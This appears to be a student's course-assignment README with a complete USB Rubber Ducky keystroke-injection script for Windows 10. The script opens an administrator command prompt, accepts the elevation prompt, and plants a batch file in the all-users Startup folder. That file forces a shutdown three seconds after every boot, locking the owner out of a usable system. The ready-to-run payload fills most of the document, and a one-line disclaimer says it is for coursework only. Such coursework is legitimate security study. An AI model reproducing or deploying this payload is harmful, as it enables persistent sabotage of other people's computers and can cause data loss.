# Infinite Shutdowns - Windows 10
## Hassan Chadad
## CS-683 USB Rubber Ducky Assignment

This ducky script is similar to the [Fork-Bomb](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---fork-bomb). But instead of having infinite processes, I will have infinite shutdowns in a way where whenever the PC starts it will force shutdown after 3 seconds.<br/>
Steps to write the script:
1. Open cmd as admin
2. Go to the startup Folder where all the files that run on startup are located
3. Create a new Batch script in the startup Folder
4. Code the Batch Script to do a force shutdown after 3 seconds without showing the command prompt window
5. Exit the Batch Script
6. Run the Batch Script
7. Close the cmd

**This script is tended to be for the course's assignment and I don't aim to use it harm or do any real attacks.**

```
REM ---------Open start Menu---------
CONTROL ESCAPE
DELAY 500
REM ---------Type cmd---------
STRING cmd 
DELAY 300
REM ---------Open cmd as admin---------
CTRL-SHIFT ENTER
DELAY 300
REM ---------Select Yes in the windows asking about running cmd as admin---------
LEFTARROW
DELAY 100
ENTER 
DELAY 1000
REM ---------Go To Startup Folder---------
STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
ENTER
REM ---------Create a batch file in the startup folder to run it on startup of the PC---------
STRING copy con h.bat
ENTER
REM ---------Code the batch file to force shutdown after 3 seconds---------
STRING @echo off
ENTER
STRING shutdown.exe /f /s /t 3 
ENTER
REM ---------Exit the batch file---------
CONTROL z
ENTER
REM ---------Run the batch file---------
STRING h.bat
ENTER
REM ---------close cmd---------
ALT F4
```